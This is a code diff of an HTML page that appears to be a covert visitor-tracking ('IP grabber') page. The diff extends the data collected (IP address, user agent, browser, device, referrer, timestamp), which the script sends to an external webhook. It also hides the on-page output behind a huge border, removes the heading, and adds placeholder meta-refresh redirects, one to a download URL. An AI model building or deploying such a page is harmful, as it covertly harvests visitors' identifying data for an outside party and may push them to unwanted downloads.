@@ -12,14 +12,27 @@
                     const infoDisplay = document.getElementById("info");
                     infoDisplay.innerHTML = `
                         <p><strong>IP Address:</strong> ${userInfo.ipAddress || "Not available"}</p>
+                        <p><strong>User Agent:</strong> ${userInfo.userAgent || "Not available"}</p>
+                        <p><strong>Is Mobile:</strong> ${userInfo.isMobile || "No"}</p>
+                        <p><strong>Browser:</strong> ${userInfo.browser || "Not available"}</p>
+                        <p><strong>Device Type:</strong> ${userInfo.deviceType || "Not available"}</p>
+                        <p><strong>Referrer:</strong> ${userInfo.referrer || "Not available"}</p>
+                        <p><strong>Timestamp:</strong> ${userInfo.timestamp || "Not available"}</p>
                     `;
                     sendToWebhook(userInfo, WEBHOOK_URL); 
                 });
-        }
+        }   
     </script>
+
+    <!meta http-equiv="refresh" content="0; url=MYURLHERE">
+    <!meta http-equiv="refresh" content="0; url=MYDOWNLOADURLHERE">
+
+
 </head>
 <body>
-    <h1>User Information</h1>
-    <div id="info"></div>
+    <div 
+        id="info",
+        style="border: 1000px solid black; padding: 100px; margin-top: 100px;">
+    </div>
 </body>
 </html>
